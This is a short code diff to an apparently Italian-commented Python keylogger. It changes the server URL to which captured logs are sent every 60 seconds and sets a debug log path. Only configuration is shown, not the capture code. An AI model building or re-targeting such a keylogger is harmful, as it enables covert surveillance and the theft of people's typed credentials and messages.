@@ -14,7 +14,7 @@ import logging
 
 # Configurazione
 UPDATE_INTERVAL = 60  # Invia al server ogni 60 secondi
-SERVER_URL = "http://192.168.1.8:5000/log"  # URL del server
+SERVER_URL = "http://172.20.22.125:3010/log"  # URL del server
 
 # Configurazione logging per debug
 LOG_FILE = os.path.join(os.path.expanduser("~"), "Documents", "keylogger_debug.log")
